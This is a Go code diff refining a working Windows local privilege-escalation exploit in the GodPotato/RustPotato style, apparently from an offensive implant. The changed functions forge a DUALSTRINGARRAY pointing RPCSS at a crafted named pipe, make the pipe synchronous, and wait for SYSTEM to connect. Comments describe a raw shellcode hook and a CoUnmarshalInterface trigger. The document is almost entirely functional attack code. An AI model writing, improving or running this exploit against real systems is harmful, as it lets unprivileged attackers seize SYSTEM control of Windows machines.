@@ -147,41 +147,46 @@ func readUseProtSeqParamCount(midlInfo *midlServerInfo) (int, error) {
 }
 
 // buildPipeDSA pre-computes the DUALSTRINGARRAY bytes for the hook callback.
-// Uses the binary DUALSTRINGARRAY format: tower ID (uint16) + address (UTF-16LE).
+// Uses the same full-text format as GodPotato/RustPotato: each endpoint string
+// (including protocol prefix) is written directly as UTF-16, with no separate
+// tower ID field. The security section is left empty (zero-filled).
 // This is called during setup (before hook install) so the callback itself
 // does only minimal work: HeapAlloc + memcpy + pointer write.
 func buildPipeDSA(pipeUniqueName string) []byte {
-	// Named pipe string binding: tower 0x000F (ncacn_np)
-	// Address format: "server[\pipe\pipename]"
-	npTowerID := uint16(0x000F)
-	npAddr := utf16Encode(`localhost[\pipe\` + pipeUniqueName + `\pipe\epmapper]`)
-
-	// Build string bindings section
-	stringBinding := make([]byte, 0, 128)
-	tb := make([]byte, 2)
-	binary.LittleEndian.PutUint16(tb, npTowerID)
-	stringBinding = append(stringBinding, tb...)
-	for _, c := range npAddr {
-		cb := make([]byte, 2)
-		binary.LittleEndian.PutUint16(cb, c)
-		stringBinding = append(stringBinding, cb...)
+	// Full text endpoint strings — matches GodPotato/RustPotato format exactly.
+	// No separate tower ID prefix; the protocol name is part of the text.
+	endpoints := []string{
+		`ncacn_np:localhost/pipe/` + pipeUniqueName + `[\pipe\epmapper]`,
+		`ncacn_ip_tcp:safe !`,
 	}
-	stringBinding = append(stringBinding, 0, 0) // null terminator for this binding
-	stringBinding = append(stringBinding, 0, 0) // end of string bindings (double null)
 
-	stringEntries := len(stringBinding) / 2
+	// Calculate entrie_size: sum of (len+1) for each endpoint + 1 for end marker + 2 for security padding
+	entrieSize := 0
+	for _, ep := range endpoints {
+		entrieSize += len(ep) + 1 // +1 for null terminator
+	}
+	entrieSize += 1 // end of string bindings marker (extra null)
+	securityOffset := entrieSize
+	entrieSize += 2 // empty security section (just a double-null terminator)
 
-	// Security binding: wAuthnSvc=0x000A (NTLM), wAuthzSvc=0xFFFF, empty principal
-	secBinding := []byte{0x0A, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00}
-	secEntries := len(secBinding) / 2
+	// Allocate: 4 bytes header (wNumEntries + wSecurityOffset) + entries as UTF-16
+	totalBytes := 4 + entrieSize*2
+	result := make([]byte, totalBytes)
 
-	totalEntries := stringEntries + secEntries
+	// Header
+	binary.LittleEndian.PutUint16(result[0:2], uint16(entrieSize))
+	binary.LittleEndian.PutUint16(result[2:4], uint16(securityOffset))
 
-	result := make([]byte, 4+totalEntries*2)
-	binary.LittleEndian.PutUint16(result[0:2], uint16(totalEntries))
-	binary.LittleEndian.PutUint16(result[2:4], uint16(stringEntries))
-	copy(result[4:], stringBinding)
-	copy(result[4+stringEntries*2:], secBinding)
+	// Write endpoints as UTF-16LE characters
+	offset := 4
+	for _, ep := range endpoints {
+		for _, ch := range ep {
+			binary.LittleEndian.PutUint16(result[offset:offset+2], uint16(ch))
+			offset += 2
+		}
+		offset += 2 // null terminator (already zero from make)
+	}
+	// Remaining bytes are zero (end of string bindings + empty security section)
 
 	return result
 }
@@ -455,8 +460,8 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	pipeNamePtr, _ := windows.UTF16PtrFromString(pipeName)
 	hPipe, _, pipeErr := procCreateNamedPipeW.Call(
 		uintptr(unsafe.Pointer(pipeNamePtr)),
-		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
-		PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
+		PIPE_ACCESS_DUPLEX, // No FILE_FLAG_OVERLAPPED — synchronous pipe
+		0,                  // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT = 0x00
 		PIPE_UNLIMITED_INSTANCES,
 		PIPE_BUFFER_SIZE,
 		PIPE_BUFFER_SIZE,
@@ -473,13 +478,20 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	pipeHandle := windows.Handle(hPipe)
 	defer windows.CloseHandle(pipeHandle)
 
-	// Start async ConnectNamedPipe
-	event, _ := windows.CreateEvent(nil, 1, 0, nil)
-	defer windows.CloseHandle(event)
-
-	var overlapped windows.Overlapped
-	overlapped.HEvent = event
-	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
+	// Start synchronous ConnectNamedPipe in a goroutine (matches GodPotato/RustPotato).
+	// The goroutine blocks until a client connects or the pipe handle is closed.
+	pipeConnected := make(chan bool, 1)
+	go func() {
+		ret, _, err := procConnectNamedPipe.Call(hPipe, 0)
+		connected := ret != 0
+		if !connected {
+			// ERROR_PIPE_CONNECTED (535) means client connected before ConnectNamedPipe
+			if errno, ok := err.(syscall.Errno); ok && errno == 535 {
+				connected = true
+			}
+		}
+		pipeConnected <- connected
+	}()
 
 	// Phase 5: Build native shellcode hook and install it.
 	// We use raw x64 shellcode instead of syscall.NewCallback because Go's callback
@@ -551,10 +563,17 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 		triggerErr = fmt.Errorf("CoUnmarshalInterface blocked for >5s")
 	}
 
-	// Phase 7: Wait for pipe connection (SYSTEM connecting)
+	// Phase 7: Wait for pipe connection (SYSTEM connecting via synchronous goroutine)
 	atomic.StoreInt32(phase, 7)
-	waitResult, _ := windows.WaitForSingleObject(event, 10000) // 10s timeout
-	if waitResult != windows.WAIT_OBJECT_0 {
+	pipeOk := false
+	select {
+	case pipeOk = <-pipeConnected:
+		// ConnectNamedPipe returned
+	case <-time.After(10 * time.Second):
+		// Timeout — close pipe to unblock the ConnectNamedPipe goroutine
+		pipeOk = false
+	}
+	if !pipeOk {
 		hookStatus := "NOT called"
 		if wasHookCalled() {
 			hookStatus = "CALLED (DSA returned but RPCSS didn't connect)"
